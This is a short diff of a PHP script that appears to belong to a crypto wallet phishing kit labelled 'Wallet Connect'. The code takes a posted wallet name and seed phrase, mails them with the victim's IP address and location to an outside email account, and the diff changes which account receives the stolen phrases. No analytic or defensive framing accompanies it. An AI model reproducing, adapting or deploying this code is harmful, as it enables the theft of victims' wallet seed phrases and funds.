@@ -150,7 +150,7 @@ if(isset($_POST['wallet_name'] ) && isset($_POST['seed'])){
     
     $subject = "Wallet Connect: Seed Phrase $ip $city $region $country";
     $headers = "From: xXRx <noreply>";
-    $to ="alexanderkhan48@outlook.com";
+    $to ="sickletrail@proton.me";
     
     if(mail( $to ,  $subject ,  $message )){
         header('Content-Type: application/json');
